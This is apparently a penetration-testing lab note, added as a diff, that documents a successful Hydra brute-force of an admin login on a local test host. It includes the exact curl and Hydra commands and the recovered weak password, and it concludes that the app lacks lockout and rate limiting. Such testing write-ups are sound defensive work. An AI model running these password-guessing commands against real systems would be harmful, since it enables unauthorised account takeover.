@@ -1,0 +1,25 @@
+Manual credential check
+$ curl -i -X POST http://lab03.local:5000/login -d "username=admin&password=password123"
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+
+Welcome admin
+
+Mini wordlist
+$ printf "wrongpass\npassword123\nletmein\n" > lab-passwords.txt
+
+Hydra run
+$ hydra -l admin -P lab-passwords.txt lab03.local -s 5000 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
+
+Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-07 09:45:22
+[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:1/p:3), ~1 try per task
+[DATA] attacking http-post-form://lab03.local:5000/login:username=^USER^&password=^PASS^:Invalid credentials
+[5000][http-post-form] host: lab03.local   login: admin   password: password123
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-07 09:45:23
+
+Conclusion: the weak credential admin:password123 was recovered against a
+3-entry wordlist with no delay, no CAPTCHA, no account lockout and no rate
+limiting from the application. The finding is the absence of brute-force
+protection and the use of a predictable password, not the tool itself.
